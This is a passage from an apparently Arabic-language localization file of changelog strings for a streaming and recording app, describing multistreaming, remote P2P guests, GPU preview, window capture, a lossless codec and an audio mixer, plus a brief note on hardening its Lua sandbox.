الضيف في جلسة الضيوف عن بُعد يعمل في متصفح عادي (كاميرا + ميكروفون، وانضمام بنقرة صريحة، وكتم ذاتي وفق نموذج البوابتين، وقناة تحدث من المضيف + عرض المضيف، ومشاركة الشاشة حيث يدعمها المتصفح، وإعادة انضمام تلقائية مع تراجع تدريجي) — دون تثبيت، ودون CDN (PeerJS مُضمَّن في الشيفرة). ولا يزال رابط <code>freally://</code> القابل للنسخ يفتح التطبيق مباشرةً.","changelog.41ecc350d86a":"<strong>المعاينة الأصلية (Windows)</strong> — أصبح أول بناء للسطح في خيط التصيير مُسلسلًا مع عمليات إيداع DirectComposition في خيط الواجهة تحت قفل التراكب (وهو سباق ضيق كانت المعاينة فيه تظهر فارغة عندما يتزامن تغيير الحجم تمامًا مع لحظة إنشاء السطح)، وأصبح مربع التحديد الأصلي يعيد استخدام حساب حجم سلسلة الاقتصاص الخاص بالمُركِّب نفسه بدلًا من نسخة مكتوبة يدويًا (TASK-NP7).","changelog.e2d476fc460a":"<strong>التقاط نافذة</strong> — لم تعد مضخة المؤشر تُولّد إطارات غير مرسومة بمعدل ~60 fps أثناء تحرك المؤشر في مكان <em>ليس</em> فوق النافذة المُلتقَطة (نافذة أخرى تحجبها، أو أي مكان آخر على سطح المكتب). اكتُشف ذلك بواسطة أداة الاختبار المباشر الجديدة التي تشغّل عملية مستقلة لكل اختبار (<code>scripts/live-capture-tests.ps1</code>، TASK-NP9)، والتي تتفادى أيضًا سباق التفكيك في WinRT/D3D الذي كان قد يُسقط عمليات التشغيل المباشرة متعددة الاختبارات.","changelog.d574645cb05e":"<strong>وثائق الميثاق</strong> — أصبحت README / PRIVACY / SECURITY تصف بصدق واجهة شبكة P2P الاختيارية الخاصة بالضيوف عن بُعد (دعوات تنتهي صلاحيتها، وانضمام بنقرة صريحة، ووسائط P2P عبر DTLS-SRTP، والوسيط لا ينقل سوى المصافحة، وخادم TURN اختياري يملكه المستخدم، ودلالات الإشراف + الحظر)، واكتسب <code>THIRD-PARTY-NOTICES.md</code> مدخلَي PeerJS + qrcode-generator اللذين كانا ناقصين.","changelog.c173f50767b2":"<strong>تقوية بيئة Lua المعزولة</strong> — أصبحت بيئة السكربتات المعزولة تغلق <code>load</code>/<code>loadstring</code> و<code>string.dump</code> من المكتبة الأساسية، لا <code>dofile</code>/<code>loadfile</code> فقط. فالدالة <code>load</code> في Lua 5.4 تقبل افتراضيًا <strong>الشيفرة الثنائية الوسيطة (bytecode)</strong>، التي لا يُتحقق من مُحمِّلها — وقطعة bytecode مصمّمة خصيصًا هي هروب من الآلة الافتراضية إلى شيفرة أصلية من شأنه أن يتجاوز البيئة المعزولة الخالية من io وos تمامًا. اكتشفته مراجعة الأمان في هذه المرحلة قبل الإصدار؛ ويؤكد اختبار انحدار أن الثلاثة جميعها أُزيلت.","changelog.1ebe7221d5d2":"[0.85.0] — 2026-07-07 (تعمّق البث: البث المتعدد / SRT / WHIP + تعمّق المشاهد/المصادر/المُرمِّزات)","changelog.2d315220f41f":"<strong>اللحظة السحرية</strong> — ابدأ البث إلى Twitch <strong>و</strong>YouTube في آن واحد مع تسجيل نسخة محلية منفصلة وحفظ إعادة مدتها 30 ثانية، مع مخرج رأسي 9:16، ومشاهد متداخلة، وتراكب دردشة مباشرة <strong>لا يحتاج أبدًا إلى مفتاح API أو تسجيل دخول</strong>.","changelog.feb4e52158c8":"أُضيف — تعمّق البث","changelog.75834546387e":"<strong>بث متعدد متزامن</strong> (TASK-601) — ابدأ البث إلى عدة وجهات في آن واحد، <strong>مباشرةً إلى كل منصة</strong> (دون خادم إعادة بث). الوجهات التي تتطابق إعدادات ترميزها <strong>تتشارك ترميزًا عتاديًا واحدًا</strong> (يُوزَّع عبر <code>tee</code> في ffmpeg)؛ والإعدادات المختلفة تُرمَّز كلٌّ على حدة. وتُفصل الوجهة الفاشلة إلى مسارها الخاص لإعادة الاتصال كي لا تجرّ أبدًا وجهة سليمة معها؛ ويعرض رصيف الإحصاءات سلامة ومعدل بت مستقلين لكل وجهة.","changelog.d7881741d3bc":"<strong>SRT وWHIP</strong> (TASK-602) — ابثّ إلى نقطة استقبال SRT مستضافة ذاتيًا أو نقطة نهاية WebRTC WHIP إلى جانب RTMP/RTMPS، مع إعادة الاتصال + مراقبة السلامة. ويُفحص دعم ffmpeg المثبّت لـ SRT/WHIP بصدق عند بدء البث. تنتقل مفاتيح بث WHIP في الترويسة <code>Authorization</code>، لا في عنوان URL أبدًا.","changelog.01e2ed129c31":"<strong>مخزن إعادة متجدد</strong> (TASK-603) — أثناء التجهيز، يحتفظ ترميز في الخلفية بآخر N ثانية كمقاطع صغيرة على القرص (ذاكرة + قرص محدودان)؛ ويحفظها اختصار عام في ملف قابل للتشغيل <strong>دون مقاطعة البث أو التسجيل</strong>، مع إعدادات مسبقة للطول + الجودة.","changelog.8abd1a3e56cd":"<strong>لوحة رأسية / لوحات متعددة</strong> (TASK-604) — لوحة ثانية (مثل 9:16) تُركَّب من أي مشهد بحجمها الخاص، <strong>قابلة للتسجيل والبث بشكل مستقل</strong> عن اللوحة الرئيسية؛ مع معاينة مباشرة وإحصاء fps خاص بها.","changelog.2c69be261f19":"أُضيف — تعمّق المشاهد / المصادر / الفلاتر / المُرمِّزات","changelog.be269b309b79":"<strong>مشاهد متداخلة، ومجموعات مصادر، وصوت لكل مشهد</strong> (TASK-605) — مشهد يُركَّب كمصدر داخل مشهد آخر (مع الحماية من الحلقات)؛ ومجموعات تتحرك/تظهر/تختفي معًا؛ وتجاوز للمازج لكل مشهد ليبدو صوت المشهد مختلفًا عن المزيج العام.","changelog.5c7ab998f7ed":"<strong>حزم الانتقالات</strong> (TASK-606) — <strong>فاصل انتقالي (stinger)</strong> (فيديو فوق القطع)، و<strong>صورة مسح بالإضاءة (luma-wipe) مخصصة</strong>، والمزيد من أنماط المسح المدمجة (أفقي / معيّن / عقارب الساعة).","changelog.4d324b472fe3":"<strong>مصدر عرض شرائح الصور + إعدادات مسبقة لبطاقات الالتقاط</strong> (TASK-607) — مجموعة صور مرتبة تتعاقب وفق مؤقّت مع مزج متقاطع اختياري، وتكرار/الثبات على الأخيرة، وعشوائي؛ وإعدادات مسبقة شائعة لصيغ Elgato/AVerMedia في أداة اختيار جهاز الفيديو (الأوضاع التي تعلنها البطاقة فعلًا فقط).","changelog.67f18114a372":"<strong>فلاتر مفتاح اللون / مفتاح الإضاءة + تأخير العرض</strong> (TASK-608) — أزل أي لون حسب المسافة في RGB (للخلفيات غير الخضراء)، واستخدم مفتاحًا حسب السطوع، وأخّر فيديو المصدر بمقدار N ms لمحاذاته مع الصوت.","changelog.8349cff49176":"<strong>تعمّق المُرمِّزات</strong> (TASK-609) — ألوان <strong>Rec.709</strong> مثبّتة في كل ترميز بصيغ النقل القياسية (فلا مزيد من ألوان HD الباهتة أو المنحرفة)، و<strong>تصغير اختياري للخرج</strong> (التسجيل/البث بدقة تختلف عن دقة اللوحة — لكل وجهة بث)، ومسارات لمعدلات إطارات عالية (120/144/240) + 4K. ويُوثَّق HDR بصدق على أنه خارج النطاق (اللوحة SDR بعمق 8 بت).","changelog.e821097e85ca":"<strong>علامات الفصول في التسجيل</strong> (TASK-610) — يُدرج اختصار العلامة فصلًا في التسجيل الجاري (فصول mkv، أو ملف مرافق مقروء للحاويات الأخرى). أما علامات البث على جانب المنصة فتحتاج إلى واجهات API للحسابات — وهي مستبعدة بحكم الميثاق، وهذا مذكور بصدق داخل المنتج.","changelog.9ee401a2a83a":"<strong>تراكب الدردشة المباشرة</strong> (TASK-613) — سجل شفاف ومختوم بالوقت على اللوحة لدردشة البث المباشر الواردة (اسم المستخدم + الرسالة + طابع زمني بنظام 12 ساعة). <strong>لا يحتاج المستخدم النهائي أبدًا إلى مفتاح API، أو حساب مطوّر، أو تسجيل دخول إلى YouTube أو Twitch:</strong> يُقرأ YouTube عبر عميل InnerTube مملوك تمامًا كمشغّل الويب، ويُقرأ Twitch عبر IRC مجهول الهوية، ويُستطلَع Kick عبر نقطة النهاية العامة الخاصة به. وتدفق الرسائل الغزير لا يفعل سوى إخراج الأسطر القديمة — ولا يمكنه أبدًا أن يعطّل البث، أو التسجيل، أو التراكب.","changelog.fcfab0e66cef":"<strong>تراكب التفاعلات العائمة</strong> (TASK-614) — رموز تعبيرية لتفاعلات المشاهدين ترتفع وتتلاشى <strong>مدمجة في البرنامج</strong> (تُسجَّل وتُبث)، من شريط التفاعلات داخل التطبيق أو تُلتقط من استقبال الدردشة نفسه الذي لا يحتاج إلى مفتاح؛ ومجمّع الجسيمات المحدود يعني أن فيض التفاعلات لا يفعل سوى وضع سقف لما يظهر على الشاشة.","changelog.b7f3aacf8907":"مؤجَّل (بصراحة)","changelog.d7babe268df3":"<strong>تعمّق الكاميرا الافتراضية</strong> (TASK-611) — الكاميرا الافتراضية الحقيقية مكوّن برنامج تشغيل موقّع في نظام التشغيل (وهي مرحلة مستقلة). يُشحن الآن نموذج التغذية (البرنامج / الرأسي / مصدر واحد) ونقطة ربط النقل لكل نظام تشغيل؛ ويبقى الزر معطَّلًا والقصة كاملة في تلميحه.","changelog.d1bbc34e384f":"<strong>مصدر المتصفح</strong> (TASK-612) — توصي دراسة تصميم استكشافية (<code>design/browser-source-spike.md</code>) بتضمين من فئة CEF يُشحن كمكوّن عند الطلب (مثل ffmpeg)؛ والقرار لـ Mike.","changelog.39e93c6d3eb9":"[0.70.0] — 2026-07-06 (البث + النسخة الأولية من الاستوديو (MVP) — أول إصدار عام)","changelog.2b4289185858":"الاستوديو الذي يمكنك البث المباشر به: بث RTMP/RTMPS إلى وجهة واحدة، ووضع الاستوديو + انتقالات GPU، واختصارات عامة، وملفات التعريف + مجموعات المشاهد، ورصيف إحصاءات حقيقي — وتعاون <strong>الضيوف عن بُعد</strong> الكامل عبر P2P مدموجًا من المرحلة R.","changelog.1ab82763e794":"<strong>البث إلى وجهة واحدة</strong> (RTMP/RTMPS إلى Twitch/YouTube/Kick/Facebook/Trovo/مخصص) مع مفتاح بث سري ومحجوب، وتراجع تدريجي لإعادة الاتصال، وتسجيل تلقائي عند بدء البث؛ ولا يتأثر التسجيل المحلي أبدًا بحالة البث.","changelog.5d254b2963c1":"<strong>وضع الاستوديو + انتقالات GPU</strong> — جزء معاينة مباشرة وانتقال تثبيت (قطع/تلاشٍ/انزلاق/سحب/إضاءة) يراه الجمهور.","changelog.a95243dac70b":"<strong>اختصارات عامة</strong> (التسجيل / بدء البث / الانتقال) و<strong>رصيف إحصاءات حقيقي</strong> (fps / الإطارات المُسقَطة / زمن التصيير بالـ ms + نسبة CPU% / الذاكرة لهذه العملية).","changelog.1bff268c26f0":"<strong>ملفات التعريف + مجموعات المشاهد</strong> — إعدادات قابلة للتبديل + لقطات للمشاهد، تُحفظ عبر عمليات إعادة التشغيل.","changelog.3e3cc955eb95":"<strong>الضيوف عن بُعد (المرحلة R)</strong> — تعاون عن بُعد اختياري عبر P2P/WebRTC: روابط دعوة تنتهي صلاحيتها، وميكروفون الضيف في المازج، وكتم بالبوابتين، وإبراز المتحدث، وتخطيط الشاشة مع الزوايا، وخادم ترحيل TURN اختياري يملكه المستخدم نفسه (دون أي بنية تحتية يديرها المؤلف).","changelog.2fd6b77c5ce7":"[0.56.0] — 2026-07-06 (معاينة GPU أصلية + ترقيات التقاط النافذة)","changelog.6536f40e75b5":"أصبحت المعاينة <em>تُشعرك</em> بأنها OBS على <strong>Windows وmacOS وLinux</strong>: يُرسم خرج GPU الخاص بالمُركِّب مباشرةً على الشاشة دون رحلة ذهاب وإياب للقراءة/الترميز — ويختار التقاط النافذة بصور مصغّرة مباشرة، ويصمد بعد إعادة التشغيل، ويتعافى من تلقاء نفسه.","changelog.c5202dd3e1c5":"أُضيف — معاينة GPU أصلية («إحساس OBS») على Windows وmacOS وLinux","changelog.b77d015fe905":"<strong>سطح معاينة GPU أصلي بلا نسخ (zero-copy)</strong> يستبدل معاينة القراءة ← JPEG ← اللوحة بخرج GPU الخاص بالمُركِّب نفسه مرسومًا مباشرةً على الشاشة — دون رحلة ترميز ذهابًا وإيابًا، ودون تأخير. لكل نظام تشغيل: على <strong>Windows</strong> سطح <strong>DirectComposition</strong> (wgpu <code>SurfaceTargetUnsafe::CompositionVisual</code> على DX12) يُركَّب <em>فوق</em> WebView2، <strong>وقد جرى التحقق من عمله في الزمن الحقيقي على عتاد فعلي</strong>؛ وعلى <strong>macOS</strong> طبقة <strong>CAMetalLayer</strong> فوق WKWebView (Metal)؛ وعلى <strong>Linux</strong> نافذة X11 فرعية تقود سطح <strong>Vulkan/GL</strong> (يحتفظ Wayland بمعاينة JPEG في الوقت الحالي). وقد <strong>ثبت في CI أن الثلاثة تعرض فعلًا</strong> — إذ يتحقق اختبار لقطة الشاشة السريع من البكسلات الفعلية عند كل دفع. و<strong>يُرسم مربع التحديد التفاعلي + مقابض التحويل داخل إطار GPU نفسه</strong> (للمعاينة فقط — لا يُسجَّل ولا يُبث أبدًا). وفي العمق، <strong>رُقّيت حزمة GPU من wgpu 0.20 إلى 27</strong>. وتبقى معاينة JPEG بديلًا احتياطيًا شاملًا وتعود تلقائيًا كلما تعذّر استخدام السطح الأصلي (GPU على Windows لا يدعم DX12، أو Wayland، أو فقدان السطح).","changelog.0f1a68ade361":"أُضيف — أداة اختيار نوافذ بصور مصغّرة مباشرة تعرض كل نافذة","changelog.dc9f6df8df56":"<strong>أصبحت أداة اختيار التقاط النافذة تعرض صورة مصغّرة مباشرة لكل نافذة مفتوحة</strong> — شبكة مربعات من إطارات ملتقطة حقيقية، تُحدَّث أثناء فتح الأداة (بشكل متدرّج كي لا يُثقل فتحُها الواجهة الخلفية دفعة واحدة)، مع زر تحديث يدوي. تنتقل الصور المصغّرة بوصفها <strong>عناوين <code>data:</code> بصيغة JPEG في الذاكرة عبر IPC — ولا يُكتب أي شيء على القرص أبدًا</strong>، لذا تختفي لحظة إغلاق الأداة.","changelog.3519efd99c8a":"<strong>تُعرض النوافذ المصغّرة أيضًا</strong> (كانت تُستبعد سابقًا): يلجأ Windows إلى الحجم المستعاد للنافذة عندما تكون مصغّرة، ويحصي macOS النوافذ خارج الشاشة، وكان Linux/X11 يعرضها أصلًا. وتفتح <strong>مهمة CI مخصصة لإحصاء النوافذ</strong> نافذتين، وتصغّر إحداهما، وتتحقق من ظهور كلتيهما.","changelog.87f9b12b0ac3":"<strong>اختفى إطار الالتقاط الأصفر في Windows</strong> — أصبحت جلسات Windows.Graphics.Capture تطلب عدم إظهار الإطار (بأفضل جهد؛ إذ تحتفظ بناءات Windows الأقدم التي لا تدعم ذلك بالسلوك القديم).","changelog.a153cea5d4be":"أُضيف — التقاط نافذة يعيد الارتباط عند إعادة التشغيل + تعافٍ تلقائي","changelog.3e74cf2927b9":"**أصبح التقاط النافذة يعيد الارتباط بالنافذة <em>نفسها</em> عند إعادة تشغيل التطبيق<strong> — كما يفعل OBS Studio. فمقبض النافذة في نظام التشغيل (<code>HWND</code> في Windows، و<code>CGWindowID</code> في macOS، وXID في X11) صالح لجلسة واحدة فقط، لذا أصبح مصدر النافذة المحفوظ يخزّن أيضًا </strong>الهوية الدائمة<strong> للنافذة — ملفها التنفيذي / التطبيق المالك لها، وفئة النافذة، وعنوانها — وعند البدء </strong>يعيد تحديد النافذة الحية بمطابقة تلك الهوية**، مرتكزًا على التطبيق كي لا يرتبط أبدًا ببرنامج لا صلة له (وتحسم الفئة + العنوان التعادل بين عدة نوافذ للتطبيق نفسه). ولا تزال المعرّفات القائمة على المقبض فقط من المشاهد المحفوظة الأقدم تُحمَّل. <em>جرى التحقق على Windows على عتاد فعلي؛ ويتشارك macOS (ScreenCaptureKit) وLinux/X11 أداة المطابقة نفسها ويُتحقق منهما في CI؛ ولا يتأثر Wayland — إذ تعيد بوابة النظام فيه اختيار المصدر، وهي دائمة أصلًا.</em>","changelog.55f49748f04d":"<strong>تتعافى عمليات الالتقاط المتعثرة من تلقاء نفسها.</strong> مصدر التقاط الشاشة / النافذة / الفيديو الذي فشل لأن نافذته أو شاشته أو كاميرته لم تكن موجودة بعد <strong>يُعاد محاولته تلقائيًا</strong> (تراجع أُسّي لكل مصدر، من 3 s يتضاعف حتى 60 s)، فيعمل مباشرةً لحظة إعادة فتح النافذة أو إعادة توصيل الجهاز — دون الحاجة إلى إعادة المحاولة يدويًا (ويبقى زر إعادة المحاولة لدفعة عند الطلب). أما مصادر بوابة اختيار الشاشة ومصادر الوسائط فتُترك كما هي.","changelog.e0a0ac02515e":"<strong>تُكتشف النافذة المُلتقَطة التي تُغلق في منتصف الجلسة بشكل موثوق.</strong> لا يُطلَق حدث إغلاق الالتقاط في Windows أبدًا لبعض التطبيقات ذات الصلاحيات المرتفعة / التي تختبئ في منطقة الإعلام، مما كان سيترك المصدر متجمدًا «مباشرًا» على آخر إطار له؛ وأصبح الالتقاط يراقب أيضًا مقبض النافذة نفسه ويُصدر خطأً لحظة اختفاء النافذة فعلًا — وهذا بالضبط ما يُفعّل التعافي التلقائي المذكور أعلاه.","changelog.67f786726842":"<strong>أصبح مؤشر الماوس يُتتبَّع في التقاط النافذة — سواء أكانت في التركيز أم لا.</strong> لا يدمج Windows المؤشر إلا في التقاطات النافذة <em>ذات التركيز</em> (أما النافذة غير ذات التركيز فلا تحصل على مؤشر، ولا على أي إطارات على الإطلاق ما دام محتواها ثابتًا)، لذا كان التطبيق المُلتقَط الذي لا تنقر عليه يبدو متجمدًا. أصبح Freally Capture <strong>يرسم المؤشر بنفسه</strong>، كما يفعل OBS — بأشكال مؤشر حقيقية (ألفا، والقناع الكلاسيكي، والمؤشرات العاكسة)، تُتتبَّع مباشرةً وتُدمج في الإطار، مع توليد إطارات عندما لا يتحرك سوى المؤشر. القياس على عتاد فعلي: انتقلت نافذة غير ذات تركيز من ~0 تحديث إلى <strong>55 fps مع الحركة السريعة / 32 fps بسرعة التحويم</strong>. وحظي <strong>التقاط الشاشة</strong> بالمعالجة نفسها: يواصل المؤشر الحركة في التسجيل حتى عندما يكون باقي سطح المكتب ثابتًا.","changelog.768c67ad0574":"[0.55.0] — 2026-07-03 (مازج الصوت + التسجيل)","changelog.82a067a13f56":"درجة 0.55.0 هي <strong>المرحلة 3 (مازج الصوت + الفلاتر)</strong> إضافةً إلى <strong>المرحلة 4 (التسجيل)</strong> — أصبح الاستوديو قادرًا على مزج تغذية البرنامج و<strong>تسجيلها</strong> على القرص، متعددة المسارات، بأفضل مُرمِّز عتادي متاح أو بالترميز بلا فقدان المملوك للتطبيق.","changelog.6550f4141d88":"أُضيف — التسجيل (المرحلة 4)","changelog.8f276d78647e":"<strong>الترميز بلا فقدان المملوك <code>freally-video</code> (<code>.frec</code>)</strong> (<code>fcap-encode</code>): صيغة التسجيل المحلي الافتراضية، كُتب هنا وهو <strong>مملوك بالكامل</strong> — فروق زمنية بين الإطارات + تنبؤ بالبكسل الأيسر على طريقة PNG + مرحلة <strong>FLZ</strong> (LZ77) مملوكة ومحاذاة على البايت، وكل تقنية فيه انتهت براءتها منذ عقود أو في الملكية العامة، <strong>دون أي اعتماديات، ودون جلب أي شيء</strong>، <code>#![forbid(unsafe_code)]</code>. تحمل الحاوية حتى <strong>6 مسارات PCM ستيريو متشابكة</strong> بمواضع عينات مطلقة (مزامنة الصوت والفيديو + إيقاف مؤقت بلا فجوات بحكم البناء)، وإطارات داخلية (intra) كل ~2 s، وفهرسًا للانتقال، و<strong>قارئًا يتحمّل الاقتطاع</strong> (يُشغَّل التسجيل المنهار حتى آخر جزء مكتمل منه؛ والمدخلات التالفة تُصدر أخطاء، ولا تُسبب ذعرًا أبدًا، ويُحدّ تخصيص الذاكرة لها في مواجهة الملفات العدائية). جرى التحقق في الزمن الحقيقي: ترميز اصطناعي بدقة 1080p60 يلتزم بميزانيته.","changelog.8d5c44a0b1af":"<strong>اكتشاف المُرمِّزات + فهرس المُرمِّزات</strong>: يقود فحص GPU عبر <code>wgpu</code> (معرّفات المورّدين + استدلالات الأسماء، مع تخطي أدوات التنقيط البرمجية) قواعد العرض لكل نظام تشغيل — <strong>NVENC / Quick Sync / AMF</strong> على Windows، و<strong>NVENC / VAAPI</strong> (مشروط بوجود render-node) على Linux، و<strong>VideoToolbox</strong> على macOS — دائمًا إلى جانب البدائل الاحتياطية الشاملة على CPU <strong>x264 / x265 / AV1</strong>. تُعرض المُرمِّزات العتادية كمرشّحين صادقين و<strong>يُؤكَّد عملها بترميز تجريبي حقيقي من 3 إطارات</strong> عند أول استخدام (يختلف الدعم حسب GPU + برنامج التشغيل)؛ وكل مُرمِّز نقل قياسي يوضّح اعتماده على ffmpeg.","changelog.14fd14e34068":"<strong>الدمج متعدد المسارات، والحاويات، وتقسيم الملفات</strong>: سجّل بصيغ <strong>mp4 / mkv / mov / webm</strong> (ترميزات النقل القياسية) أو بصيغة <strong><code>.frec</code></strong> المملوكة (بلا فقدان)، مع <strong>ما يصل إلى 6 مسارات صوتية</strong>، و<strong>تقسيم تلقائي للملفات</strong> إلى مقاطع مستقلة قابلة للتشغيل. يشغّل محرك التسجيل ساعة CFR صارمة (عدد الإطارات مقيّد بالزمن المسجَّل)، لذا يبقى الصوت والفيديو متزامنين رغم التوقفات، و<strong>يكون الإيقاف المؤقت/الاستئناف بلا فجوات داخل ملف واحد قابل للتشغيل</strong>. صُمم التسجيل الرئيسي ليستمر بغض النظر عن حالة البث (يصل البث في 0.70.0)، وتُحفظ له <strong>نسخة محلية بمسار منفصل</strong>.","changelog.a153199fe59d":"<strong>جسر ffmpeg عند الطلب، الموسوم بوضوح</strong> (<code>fcap-encode::ffmpeg</code>): تعمل ترميزات النقل القياسية المقيّدة ببراءات الاختراع (H.264/AAC/HEVC/AV1) عبر ffmpeg، الذي <strong>لا يُضمَّن أبدًا</strong>. عند أول استخدام يُجلب من <strong>بناء مثبّت لكل نظام تشغيل</strong> (عنوان URL + <strong>قيمة SHA-256 مدمجة في الشيفرة المصدرية</strong>، تُطابَق مع المجموع الاختباري الخاص بالناشر نفسه)، و<strong>يُتحقق من قيمة التجزئة قبل تشغيل أي شيء</strong> (عدم التطابق يُلغي التثبيت)، ويُستخرج (عضو واحد — لا تُستخدم مسارات الأرشيف للكتابة أبدًا)، ويُشغَّل بوصفه <strong>عملية منفصلة</strong> (مما يُبقي أيضًا ترخيصه LGPL/GPL معزولًا عن التطبيق المملوك). تعرض لوحة <strong>المكوّنات</strong> الموسومة بوضوح ماهيته، وسبب وجوده، والمصدر المثبّت، والتقدّم المباشر بالنسبة المئوية/من الإجمالي/MB/s؛ ولا يحتاج مسار <code>.frec</code> المملوك إلى أي شيء من ذلك.","changelog.823a023c395e":"<strong>تسجيل HEVC / AV1 + إعادة التغليف بعد التسجيل</strong>: يُسجَّل HEVC وAV1 عبر مسار ffmpeg الموسوم (بالعتاد حيث يدعمه GPU)؛ وتعرض قائمة <strong>التسجيلات</strong> (عناصر التحكم ← الملفات…) الملفات المكتملة من الأحدث إلى الأقدم وتتيح <strong>إعادة تغليف إلى MP4</strong> (من mkv إلى mp4، <code>-c copy</code>، دون إعادة ترميز، faststart، والوسم <code>hvc1</code> على HEVC). يتحقق أمر إعادة التغليف من أن المسار يقع داخل مجلد التسجيلات — فلا يمكن لعرض الويب أبدًا توجيهه إلى ملفات عشوائية.","changelog.8f8423224424":"<strong>إعدادات المُرمِّز + الإعدادات المسبقة</strong> (الإعدادات ← الخرج): التحكم في المعدل <strong>CBR / VBR / CQP</strong> + معدل البت + الفاصل بين الإطارات المفتاحية، وإعدادات مسبقة لكل مُرمِّز <strong>الجودة / متوازن / الأداء</strong> (مربوطة بالمقبض الخاص بكل عائلة)، ومعدل بت الصوت لكل مسار، وإعدادات تسجيل مسبقة بنقرة واحدة <strong>بلا فقدان / جودة عالية / متوازن</strong>. عناصر تحكم التسجيل في الرصيف: <strong>بدء / إيقاف / إيقاف مؤقت / استئناف</strong>، ومؤشر <strong>REC</strong> نابض مع المدة (باستثناء فترات الإيقاف المؤقت) + عدد المسارات، وملفات الجلسة الأخيرة أو خطؤها الصادق.","changelog.a6dabb1cab06":"<strong>مصدر الوسائط</strong> (<code>fcap-sources::media</code>) — مدموج من المرحلة 2: ملف فيديو/صورة يُركَّب على اللوحة <strong>مع صوته في المازج</strong>. تُفك الصور الثابتة مرة واحدة (مثل مصدر الصورة)؛ و<strong>يُشغَّل <code>.frec</code> عبر الترميز المملوك</strong> دون جلب أي شيء؛ وتُفك صيغ النقل القياسية عبر مكوّن ffmpeg الموسوم (فك ترميز عتادي <code>-hwaccel auto</code>، مع بديل برمجي، وتكرار/إعادة تشغيل)، ويعني مراقب الإيقاف أن وحدة فك ترميز عالقة لا يمكنها أبدًا أن تُعلق الاستوديو. يتدفق صوت الوسائط عبر <strong>محور جديد لصوت الوسائط</strong> ليحصل مقطع الوسائط على شريط مازج كامل (fader، وفلاتر، ومسارات، وإزاحة مزامنة) دون حالات خاصة.","changelog.78a7ab9818b8":"أُضيف — مازج الصوت (المرحلة 3)","changelog.bb86ddd81916":"<strong>محرك الصوت المملوك</strong> (<code>fcap-audio</code>): رسم بياني للالتقاط عبر <code>cpal</code> يعالج كل شيء داخليًا بصيغة <strong>ستيريو f32 بتردد 48 kHz</strong> في كتل مدتها 10 ms. التقاط لكل مصدر من <strong>الميكروفون / دخل الخط</strong> (دخل الصوت) و<strong>صوت سطح المكتب / النظام</strong> (خرج الصوت)، مع تحويل صيغة كلٍّ منها وإعادة تشكيل عيّناته وفق ساعة المحرك عبر <strong>مُعيد تشكيل عيّنات خطي متدفق مملوك</strong>. ويُوضَّح صوت سطح المكتب بصدق لكل نظام تشغيل: يلتقط <strong>Windows</strong> أي جهاز خرج عبر <strong>WASAPI loopback</strong>؛ ويستخدم <strong>Linux</strong> جهاز <strong>مراقبة</strong> (monitor) في PipeWire/PulseAudio؛ ويحتاج <strong>macOS</strong> إلى جهاز حلقة افتراضي (مثل BlackHole) إلى أن يصل مسار صوت عبر ScreenCaptureKit — وأدوات الاختيار تذكر ذلك وتُرشّح الأجهزة الافتراضية المعروفة.","changelog.4541b9b25062":"<strong>رسم المزج البياني</strong>: لكل مصدر <strong>تأخير إزاحة المزامنة ← سلسلة الفلاتر ← اضغط للتحدث / اضغط للكتم / الكتم / fader</strong>، يُوجَّه إلى <strong>ما يصل إلى 6 نواقل مسارات</strong> (بتعيين لكل مصدر)، ومزيج <strong>البرنامج (الرئيسي)</strong>، ومزيج <strong>المراقبة</strong>. تنعيم للكسب خالٍ من النقرات بمقدار ~8 ms عند كل تحريك للكتم/PTT/fader. والنواة بأكملها نقية و<strong>مستقلة عن الأجهزة — كل قاعدة توجيه مختبرة باختبارات وحدات دون عتاد</strong>.","changelog.805988055894":"<strong>مجموعة فلاتر DSP الكلاسيكية المملوكة — دون تعلّم آلي في أي مكان، وفق الميثاق</strong>: <strong>إزالة الضوضاء</strong> (كبح طيفي عبر STFT مع FFT بأساس 2 (radix-2) مملوك — إطارات √Hann من 512 عيّنة، وتداخل 50%، وتتبّع أرضية الضوضاء لكل حاوية تردد + طرح طيفي؛ فتنخفض الضوضاء الثابتة بينما يمر الكلام)، و<strong>بوابة ضوضاء</strong> (تخلّف hysteresis + احتفاظ)، و<strong>ضاغط</strong> (استشعار القمم، وكسب تعويضي)، و<strong>مُحدِّد</strong> (هجوم فوري مع سقف صارم)، و<strong>مُعادِل ثلاثي النطاقات</strong> (مرشحات biquad من نوع RBJ للرفّ/القمة)، و<strong>الكسب</strong>، و<strong>الخفض التلقائي</strong> عبر السلسلة الجانبية (sidechain) (خفض مصدر تحت آخر). كل معالج مقيّد دفاعيًا كي لا يتمكن مشهد مُعدَّل يدويًا من إحداث انفلات.","changelog.d379afe46aba":"<strong>المراقبة، والخفض التلقائي، وPTT/PTM، وLUFS</strong>: <strong>خرج مراقبة</strong> على أي جهاز (محدود، وآمن من النقص underrun)؛ وخفض تلقائي عبر السلسلة الجانبية يقوده الغلاف المباشر للمصدر المُشغِّل؛ و<strong>اضغط للتحدث / اضغط للكتم</strong> عبر اختصارات عامة (تُسجَّل من النموذج، مع الصراحة بشأن افتقار Wayland إلى الاختصارات العامة)؛ ومقياس <strong>LUFS بترجيح K وفق BS.1770</strong> (لحظي + قصير المدى) على مزيج البرنامج؛ وقياس القمة/RMS لكل مصدر.","changelog.df9eeebe72aa":"<strong>لوحة مازج الصوت</strong>: <strong>شريط قناة</strong> واحد لكل مصدر صوت في المشهد النشط — الاسم + الحالة، و<strong>مقياس VU</strong> (أخضر ← أصفر ← أحمر، مع علامة القمة)، و<strong>fader</strong> (−60…+6 dB)، و<strong>كتم</strong>، ودورة <strong>المراقبة</strong>، ومربع حوار <strong>فلاتر الصوت</strong> (الفلاتر السبعة كلها، مع أداة اختيار المُشغِّل للخفض التلقائي)، و<strong>نقاط المسارات 1–6</strong>، ونافذة منبثقة متقدمة (إزاحة المزامنة + اختصارات PTT/PTM). وقراءة <strong>LUFS</strong> وأداة اختيار <strong>جهاز المراقبة</strong> (محفوظة في الإعدادات). تظهر مصادر الصوت في شريط المصادر بنقاط الحالة المباشرة نفسها التي للفيديو، وفي قائمة <strong>إضافة مصدر</strong> مع أدوات اختيار أجهزة صادقة لكل نظام تشغيل.","changelog.97f0a5a2c868":"يكتسب نموذج المشهد/المصدر (<code>fcap-scene</code>) نوعَي المصدر <strong>دخل الصوت / خرج الصوت</strong> وشريط <strong><code>AudioSettings</code></strong> لكل مصدر (fader، والكتم، ووضع المراقبة، وقناع بتات المسارات، وإزاحة المزامنة، واختصارات PTT/PTM، وسلسلة فلاتر الصوت المرتبة) — مُختبَر بالتحويل ذهابًا وإيابًا عبر serde، ومُتحقَّق من صيغة camelCase في النقل، ومقيّد النطاق، ويُصلح نفسه عند التحميل (توجد حالة الصوت تمامًا على 